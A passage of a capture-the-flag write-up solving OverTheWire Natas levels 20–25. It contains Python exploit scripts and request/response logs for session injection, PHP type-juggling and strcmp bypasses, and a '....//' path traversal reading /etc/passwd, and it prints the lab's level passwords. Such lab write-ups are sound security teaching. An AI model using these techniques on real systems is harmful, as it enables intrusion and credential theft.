Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 1619
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas20", "pass": "p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw" };</script></head>
<body>
<h1>natas20</h1>
<div id="content">
DEBUG: MYREAD 969hrbu40iem1f32c61essr8ev<br>DEBUG: Reading from /var/lib/php/sessions/mysess_969hrbu40iem1f32c61essr8ev<br>DEBUG: Read [name test
]<br>DEBUG: Read [admin 1]<br>DEBUG: Read []<br>DEBUG: Name set to test
admin 1<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas21
Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH</pre>
<form action="index.php" method="POST">
Your name: <input name="name" value="test
admin 1"><br>
<input type="submit" value="Change name" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
DEBUG: MYWRITE 969hrbu40iem1f32c61essr8ev name|s:13:"test
admin 1";admin|s:1:"1";<br>DEBUG: Saving in /var/lib/php/sessions/mysess_969hrbu40iem1f32c61essr8ev<br>DEBUG: admin => 1<br>DEBUG: name => test
admin 1<br>
```

## Natas 21

### Credentials

Username: natas21

Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH

URL: http://natas21.natas.labs.overthewire.org

### Message

The first page:

**Note: this website is colocated with http://natas21-experimenter.natas.labs.overthewire.org**
You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.

The second page:

**Note: this website is colocated with http://natas21.natas.labs.overthewire.org**

Example:
Hello world!

Change example values here:

align: center
fontsize: 100%
bgcolor: yellow

### Solution

We are given the source code for the first page:

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas21", "pass": "<censored>" };</script></head>
<body>
<h1>natas21</h1>
<div id="content">
<p>
<b>Note: this website is colocated with <a href="http://natas21-experimenter.natas.labs.overthewire.org">http://natas21-experimenter.natas.labs.overthewire.org</a></b>
</p>

<?php

function print_credentials() {
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas22\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";
    }
}


session_start();
print_credentials();

?>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

and for the second one:

```html
<html>
  <head>
    <link
      rel="stylesheet"
      type="text/css"
      href="http://natas.labs.overthewire.org/css/level.css"
    />
  </head>
  <body>
    <h1>natas21 - CSS style experimenter</h1>
    <div id="content">
      <p>
        <b
          >Note: this website is colocated with
          <a href="http://natas21.natas.labs.overthewire.org"
            >http://natas21.natas.labs.overthewire.org</a
          ></b
        >
      </p>
      <?php

session_start();

// if update was submitted, store it
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key =>
      $val) { $_SESSION[$key] = $val; } } if(array_key_exists("debug", $_GET)) {
      print "[DEBUG] Session contents:<br />"; print_r($_SESSION); } // only
      allow these keys $validkeys = array("align" => "center", "fontsize" =>
      "100%", "bgcolor" => "yellow"); $form = ""; $form .= '
      <form action="index.php" method="POST">
        '; foreach($validkeys as $key => $defval) { $val = $defval;
        if(array_key_exists($key, $_SESSION)) { $val = $_SESSION[$key]; } else {
        $_SESSION[$key] = $val; } $form .= "$key:
        <input name="$key" value="$val" /><br />"; } $form .= '<input
          type="submit"
          name="submit"
          value="Update"
        />'; $form .= '
      </form>
      '; $style = "background-color: ".$_SESSION["bgcolor"]."; text-align:
      ".$_SESSION["align"]."; font-size: ".$_SESSION["fontsize"].";"; $example =
      "
      <div style="$style">Hello world!</div>
      "; ?>

      <p>Example:</p>
      <?=$example?>

      <p>Change example values here:</p>
      <?=$form?>

      <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
    </div>
  </body>
</html>
```

The idea is quite simple: we see from the second page that we can set session variables. We are interested to set `admin = 1` and reuse it in the first page.

Thus we craft two requests, both with the same session ID; the first, directed to the second URL, sets `admin = 1` in the session; the second retrieves the credentials.

```python
import base64
import requests
from requests.auth import HTTPBasicAuth

basic_auth = HTTPBasicAuth('natas21', 'BPhv63cKE1lkQl04cE5CuFTzXe15NfiH')

url1 = "http://natas21.natas.labs.overthewire.org/index.php"
url2 = "http://natas21-experimenter.natas.labs.overthewire.org/index.php?debug=1"


def send_request(url) -> str:
    cookie = "PHPSESSID=" + "admin"

    headers = {'Content-Type': 'text/html; charset=UTF-8',
               'Cookie': cookie}
    response = requests.get(url, headers=headers,
                            auth=basic_auth,
                            verify=False)
    return response.text


if __name__ == '__main__':
    text = send_request(url2 + "&submit=1&admin=1")
    print(text)
    text = send_request(url1)
    print(text)
```

This gives:

```bash
python natas21.py natas
<html>
<head><link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css"></head>
<body>
<h1>natas21 - CSS style experimenter</h1>
<div id="content">
<p>
<b>Note: this website is colocated with <a href="http://natas21.natas.labs.overthewire.org">http://natas21.natas.labs.overthewire.org</a></b>
</p>
[DEBUG] Session contents:<br>Array
(
    [debug] => 1
    [submit] => 1
    [admin] => 1
)

<p>Example:</p>
<div style='background-color: yellow; text-align: center; font-size: 100%;'>Hello world!</div>
<p>Change example values here:</p>
<form action="index.php" method="POST">align: <input name='align' value='center' /><br>fontsize: <input name='fontsize' value='100%' /><br>bgcolor: <input name='bgcolor' value='yellow' /><br><input type="submit" name="submit" value="Update" /></form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas21", "pass": "BPhv63cKE1lkQl04cE5CuFTzXe15NfiH" };</script></head>
<body>
<h1>natas21</h1>
<div id="content">
<p>
<b>Note: this website is colocated with <a href="http://natas21-experimenter.natas.labs.overthewire.org">http://natas21-experimenter.natas.labs.overthewire.org</a></b>
</p>

You are an admin. The credentials for the next level are:<br><pre>Username: natas22
Password: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz</pre>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

## Natas 22

### Credentials

Username: natas22

Password: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz

URL: http://natas22.natas.labs.overthewire.org

### Message

There's just a blank page with a link to the source code.

### Solution

The source code:

```html
<?php
session_start();

if(array_key_exists("revelio", $_GET)) {
    // only admins can reveal the password
    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
    header("Location: /");
    }
}
?>


<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas22", "pass": "<censored>" };</script></head>
<body>
<h1>natas22</h1>
<div id="content">

<?php
    if(array_key_exists("revelio", $_GET)) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas23\n";
    print "Password: <censored></pre>";
    }
?>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

This seems simple...

Though, the script

```python
import base64
import requests
from requests.auth import HTTPBasicAuth

basic_auth = HTTPBasicAuth('natas22', 'd8rwGBl0Xslg3b76uh3fEbSlnOUBlozz')

url = "http://natas22.natas.labs.overthewire.org/index.php"


def send_request(url) -> str:
    print(f"Sending request to [{url}]...")
    headers = {'Content-Type': 'text/html; charset=UTF-8'}
    response = requests.get(url,
                            headers=headers,
                            auth=basic_auth,
                            verify=False)
    return response.text


if __name__ == '__main__':
    text = send_request(url + "?revelio=1")
    print(text)
```

doesn't work as expected:

```bash
python natas22.py
Sending request to [http://natas22.natas.labs.overthewire.org/index.php?revelio=1]...


<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas22", "pass": "d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz" };</script></head>
<body>
<h1>natas22</h1>
<div id="content">


<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Trying with Burp. The request:

```
GET /?revelio=1 HTTP/1.1
Host: natas22.natas.labs.overthewire.org
User-Agent: [UNDISCLOSED]
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Basic bmF0YXMyMjpkOHJ3R0JsMFhzbGczYjc2dWgzZkViU2xuT1VCbG96eg==
Connection: keep-alive
Cookie: PHPSESSID=geosrhe1qijrg261strl2fgfat
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Priority: u=0, i
```

passed to Repeater and sent, gives:

```
HTTP/1.1 302 Found
Date: Sun, 20 Oct 2024 14:52:57 GMT
Server: Apache/2.4.58 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: /
Content-Length: 1028
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8



<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas22", "pass": "d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz" };</script></head>
<body>
<h1>natas22</h1>
<div id="content">

You are an admin. The credentials for the next level are:<br><pre>Username: natas23
Password: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs</pre>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

## Natas 23

### Credentials

Username: natas23

Password: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs

URL: http://natas23.natas.labs.overthewire.org

### Message

The page requires a password.

### Solution

We are given the source code:

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas23", "pass": "<censored>" };</script></head>
<body>
<h1>natas23</h1>
<div id="content">

Password:
<form name="input" method="get">
    <input type="text" name="passwd" size=20>
    <input type="submit" value="Login">
</form>

<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas24 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

This seems to verify that `iloveyou` is contained in the password; moreover, the password should be in some sense greater than `10`: `$_REQUEST["passwd"] > 10`. We can guess that some sort of casting is happening...

Let's try something like `1234iloveyou`:

```python
import base64
import requests
from requests.auth import HTTPBasicAuth

basic_auth = HTTPBasicAuth('natas23', 'dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs')

url = "http://natas23.natas.labs.overthewire.org/index.php"


def send_request(url) -> str:
    print(f"Sending request to [{url}]...")
    headers = {'Content-Type': 'text/html; charset=UTF-8'}
    response = requests.get(url,
                            headers=headers,
                            auth=basic_auth,
                            verify=False)
    return response.text


if __name__ == '__main__':
    text = send_request(url + "?passwd=1234iloveyou")
    print(text)
```

Easy job:

```bash
python natas23.py
Sending request to [http://natas23.natas.labs.overthewire.org/index.php?passwd=1234iloveyou]...
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas23", "pass": "dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs" };</script></head>
<body>
<h1>natas23</h1>
<div id="content">

Password:
<form name="input" method="get">
    <input type="text" name="passwd" size=20>
    <input type="submit" value="Login">
</form>

<br>The credentials for the next level are:<br><pre>Username: natas24 Password: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd</pre>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

## Natas 24

### Credentials

Username: natas24

Password: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd

URL: http://natas24.natas.labs.overthewire.org

### Message

The page requests a password.

### Solution

We are given the source:

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas24", "pass": "<censored>" };</script></head>
<body>
<h1>natas24</h1>
<div id="content">

Password:
<form name="input" method="get">
    <input type="text" name="passwd" size=20>
    <input type="submit" value="Login">
</form>

<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(!strcmp($_REQUEST["passwd"],"<censored>")){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas25 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Ok, first thought: we must brute-force. This is going to take like forever...

Hold on, think more. Read more about the function `strcmp`.

Interestingly, we find in [the documentation](https://www.php.net/manual/en/function.strcmp.php) for `strcmp`:

> If you rely on strcmp for safe string comparisons, both parameters must be strings, the result is otherwise extremely unpredictable.
> For instance you may get an unexpected 0, or return values of NULL, -2, 2, 3 and -3.

Interestingly:

```
strcmp("foo", array()) => NULL + PHP Warning
```

The script:

```python
import requests
from requests.auth import HTTPBasicAuth

basic_auth = HTTPBasicAuth('natas24', 'MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd')

url = "http://natas24.natas.labs.overthewire.org/index.php"


def send_request(url) -> str:
    print(f"Sending request to [{url}]...")
    headers = {'Content-Type': 'text/html; charset=UTF-8'}
    response = requests.get(url,
                            headers=headers,
                            auth=basic_auth,
                            verify=False)
    return response.text


if __name__ == '__main__':
    text = send_request(url + f"?passwd[]=asd")
    print(text)
```

gives us:

```bash
$ python natas24.py
Sending request to [http://natas24.natas.labs.overthewire.org/index.php?passwd[]=asd]...
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas24", "pass": "MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd" };</script></head>
<body>
<h1>natas24</h1>
<div id="content">

Password:
<form name="input" method="get">
    <input type="text" name="passwd" size=20>
    <input type="submit" value="Login">
</form>

<br />
<b>Warning</b>:  strcmp() expects parameter 1 to be string, array given in <b>/var/www/natas/natas24/index.php</b> on line <b>23</b><br />
<br>The credentials for the next level are:<br><pre>Username: natas25 Password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws</pre>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

## Natas 25

### Credentials

Username: natas25

Password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws

URL: http://natas25.natas.labs.overthewire.org

### Message

There is a quote:

> Quote
>
> You see, no one's going to help you Bubby, because there isn't anybody out there to do it. No one. We're all just complicated arrangements of atoms and subatomic particles - we don't live. But our atoms do move about in such a way as to give us identity and consciousness. We don't die; our atoms just rearrange themselves. There is no God. There can be no God; it's ridiculous to think in terms of a superior being. An inferior being, maybe, because we, we who don't even exist, we arrange our lives with more order and harmony than God ever arranged the earth. We measure; we plot; we create wonderful new things. We are the architects of our own existence. What a lunatic concept to bow down before a God who slaughters millions of innocent children, slowly and agonizingly starves them to death, beats them, tortures them, rejects them. What folly to even think that we should not insult such a God, damn him, think him out of existence. It is our duty to think God out of existence. It is our duty to insult him. Fuck you, God! Strike me down if you dare, you tyrant, you non-existent fraud! It is the duty of all human beings to think God out of existence. Then we have a future. Because then - and only then - do we take full responsibility for who we are. And that's what you must do, Bubby: think God out of existence; take responsibility for who you are.
> Scientist, Bad Boy Bubby

One can choose the language between English and German.

> Zitat
>
> Weißt du, niemand wird dir helfen Bubby. Denn es gibt Niemand, der dazu vorgesehen ist. Niemand. Wir sind alle nur komplizierte Anordnungen von Atomen und subatomaren Teilchen. Wir leben nicht. Unsere atome bewegen sich in einer Art und Weise, die uns Identität und Bewustesein verleiht. Wir sterben auch nicht. Unsere Atome strukturieren sich nur um. Es gibt keinen Gott, es kann keinen Gott geben. Es ist lächerlich, in Kategorien eines höheren Wesens zu denken. Eines niedrigeren Wesens, das könnte es vielleicht geben. Weil wir, die wir nicht mal existieren, unser Leben mit mehr Ordnung und Harmonie gestalten, als Gott jemals die Erde gestaltet hat. Wir essen, wir planen, wir erschaffen wunderbare Musik. Wir sind die Architekten unserer eigenen Existenz. Was für eine idiotische Vorstellung, sich vor einem Gott zu verneigen, der Millionen unschuldiger Kinder abschlachten lässt. Der für ihren langsamen und qualvollen Hungertod verantwortlich ist. Der zusieht, wie sie geschlagen und gefoltert werden. Der sie abweist. Welche Dummheit, auch nur zu denken, dass wir einen solchen Gott nicht beleidigen dürfen. Verdammt nochmal! Leugnen wir doch einfach seine Existenz. Es ist unsere Pflicht, die Existenz Gottes zu leugnen. Es ist unsere Pflicht, ihn zu beleidigen. Leck mich am Arsch, Gott! Schlag mich nieder, wenn du dich traust, du Tyrann! Du nicht existierender Betrug. Es ist die Pflicht aller menschlichen Wesen, die Existenz Gottes zu verneinen. Dann haben wir eine Zukunft. Denn dann, und nur dann, übernehmen wir die volle Verantwortung für das, was wir sind. Und genau das musst du tun, Bubby. Denk Gottes Existenz einfach weg. Übernimm die Verantwortung für das, was du bist.
> Wissenschaftler, Bad Boy Bubby

There is a link to the source code.

### Solution

The source code linked is:

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas25", "pass": "<censored>" };</script></head>
<body>
<?php
    // cheers and <3 to malvina
    // - morla

    function setLanguage(){
        /* language setup */
        if(array_key_exists("lang",$_REQUEST))
            if(safeinclude("language/" . $_REQUEST["lang"] ))
                return 1;
        safeinclude("language/en");
    }

    function safeinclude($filename){
        // check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
        // dont let ppl steal our passwords
        if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
        // add more checks...

        if (file_exists($filename)) {
            include($filename);
            return 1;
        }
        return 0;
    }

    function listFiles($path){
        $listoffiles=array();
        if ($handle = opendir($path))
            while (false !== ($file = readdir($handle)))
                if ($file != "." && $file != "..")
                    $listoffiles[]=$file;

        closedir($handle);
        return $listoffiles;
    }

    function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n";
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
?>

<h1>natas25</h1>
<div id="content">
<div align="right">
<form>
<select name='lang' onchange='this.form.submit()'>
<option>language</option>
<?php foreach(listFiles("language/") as $f) echo "<option>$f</option>"; ?>
</select>
</form>
</div>

<?php
    session_start();
    setLanguage();

    echo "<h2>$__GREETING</h2>";
    echo "<p align=\"justify\">$__MSG";
    echo "<div align=\"right\"><h6>$__FOOTER</h6><div>";
?>
<p>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

The PHP part:

```php
<?php
    // cheers and <3 to malvina
    // - morla

    function setLanguage(){
        /* language setup */
        if(array_key_exists("lang",$_REQUEST))
            if(safeinclude("language/" . $_REQUEST["lang"] ))
                return 1;
        safeinclude("language/en");
    }

    function safeinclude($filename){
        // check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
        // dont let ppl steal our passwords
        if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
        // add more checks...

        if (file_exists($filename)) {
            include($filename);
            return 1;
        }
        return 0;
    }

    function listFiles($path){
        $listoffiles=array();
        if ($handle = opendir($path))
            while (false !== ($file = readdir($handle)))
                if ($file != "." && $file != "..")
                    $listoffiles[]=$file;

        closedir($handle);
        return $listoffiles;
    }

    function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n";
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
?>
```

The main page is `http://natas25.natas.labs.overthewire.org/`. Notice that setting the language as `de` redirects us to `http://natas25.natas.labs.overthewire.org/?lang=de`. Try the basic tampering method (that should fail according to the PHP code above): go to `http://natas25.natas.labs.overthewire.org/?lang=../`. This produces the error:

> Warning: include(/var/www/natas/natas25/language): failed to open stream: No such file or directory in /var/www/natas/natas25/index.php on line 38
>
> Warning: include(): Failed opening 'language/' for inclusion (include_path='.:/usr/share/php') in /var/www/natas/natas25/index.php on line 38
>
> Notice: Undefined variable: \_\_GREETING in /var/www/natas/natas25/index.php on line 80
>
> Notice: Undefined variable: \_\_MSG in /var/www/natas/natas25/index.php on line 81
>
> Notice: Undefined variable: \_\_FOOTER in /var/www/natas/natas25/index.php on line 82

We can try to bypass the `"../"` replacement with `""` requesting `http://natas25.natas.labs.overthewire.org/?lang=....//`.

> Warning: include(/var/www/natas/natas25): failed to open stream: No such file or directory in /var/www/natas/natas25/index.php on line 38
>
> Warning: include(): Failed opening 'language/../' for inclusion (include_path='.:/usr/share/php') in /var/www/natas/natas25/index.php on line 38
>
> Notice: Undefined variable: \_\_GREETING in /var/www/natas/natas25/index.php on line 80
>
> Notice: Undefined variable: \_\_MSG in /var/www/natas/natas25/index.php on line 81
>
> Notice: Undefined variable: \_\_FOOTER in /var/www/natas/natas25/index.php on line 82

Moreover, if we request `http://natas25.natas.labs.overthewire.org/?lang=....//....//....//`:

> Warning: include(/var/www): failed to open stream: No such file or directory in /var/www/natas/natas25/index.php on line 38
>
> Warning: include(): Failed opening 'language/../../../' for inclusion (include_path='.:/usr/share/php') in /var/www/natas/natas25/index.php on line 38
>
> Notice: Undefined variable: \_\_GREETING in /var/www/natas/natas25/index.php on line 80
>
> Notice: Undefined variable: \_\_MSG in /var/www/natas/natas25/index.php on line 81
>
> Notice: Undefined variable: \_\_FOOTER in /var/www/natas/natas25/index.php on line 82

Let's try if this technique actually works with a file: `http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//etc/passwd` correctly returns the `/etc/passwd` file!

Try with `....//....//....//....//..../etc/natas_webpass/natas26`: the request to `http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//..../etc/natas_webpass/natas26` does not give any output. This was expected...

Looking better at the PHP code:

```php
function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n";
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
```

Here there is a `fopen` function call... We need to know our session ID. Looging at the cookies, we can easily get it: there is a cookie called `PHPSESSID`, which, for example has the value: `04mg3fhcld4h0i63i2b500cjgo`.

Request `http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....///var/www/natas/natas25/logs/natas25_04mg3fhcld4h0i63i2b500cjgo.log` and get:

